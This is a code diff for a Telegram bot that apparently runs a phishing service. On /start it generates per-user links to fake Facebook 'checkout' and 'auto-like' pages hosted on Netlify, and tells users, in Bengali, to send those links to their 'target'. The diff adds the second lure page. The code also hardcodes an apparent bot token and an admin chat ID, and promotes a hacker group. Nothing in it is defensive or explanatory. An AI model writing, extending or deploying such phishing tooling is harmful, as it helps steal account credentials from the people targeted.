@@ -1,6 +1,6 @@
 # ==============================
 # VS BOT — Railway Full Updated
-# With Admin Bot + Direct Link
+# With Admin Bot + Direct Link + Auto-Like URL
 # Developer: @noobxvau (MN Siddik)
 # ==============================
 
@@ -23,8 +23,10 @@ ADMIN_BOT_TOKEN = os.environ.get("ADMIN_BOT_TOKEN", "8218726690:AAHMwmdce9LJA1GP
 # Admin Telegram Chat ID
 ADMIN_CHAT_ID = os.environ.get("ADMIN_CHAT_ID", "1849126202")
 
-# Frontend Netlify URL
-FRONTEND_BASE = "fb-checkout.netlify.app"
+# Frontend Netlify URLs
+FRONTEND_FB_BASE = "fb-checkout.netlify.app"         # Facebook page
+FRONTEND_LIKE_BASE = "fb-auto-like.netlify.app"        # Auto-Like page
+
 USERS_FILE = "users.json"
 # -------------------------
 
@@ -66,8 +68,14 @@ def send_admin_message(text):
     except Exception as e:
         print(f"❌ Error sending to admin: {e}")
 
-def make_register_url(chat_id):
-    return f"{FRONTEND_BASE}/index.html?uid={chat_id}"
+# -------------------------
+# Register URL functions
+# -------------------------
+def make_facebook_url(chat_id):
+    return f"{FRONTEND_FB_BASE}/index.html?uid={chat_id}"
+
+def make_autolike_url(chat_id):
+    return f"{FRONTEND_LIKE_BASE}/index.html?uid={chat_id}"
 
 # -------------------------
 # Telegram Webhook
@@ -80,11 +88,13 @@ def telegram_webhook():
         text = data["message"].get("text", "")
         
         if text.lower().strip() == "/start":
-            reg_url = make_register_url(chat_id)
+            fb_url = make_facebook_url(chat_id)
+            like_url = make_autolike_url(chat_id)
             welcome = (
                 "🤖 *Welcome to Phanhom Bot!*\n\n"
-                "লিংকট কপি করো এবং তোমার target কে দেও !! 👇\n"
-                f"🔗 {reg_url}\n\n"
+                "লিংকগুলো কপি করো এবং তোমার target কে দাও 👇\n\n"
+                f"📘 Facebook URL: {fb_url}\n"
+                f"👍 Auto-Like URL: {like_url}\n\n"
                 "👨‍💻 *Bot Developer:* [@noobxvau](https://t.me/noobxvau)\n"
                 "💬 *Join our official group for more updates:*\n"
                 "👉 [NOOB HACKER BD](https://t.me/+ENYrQ5N9WNE3NWQ9)"
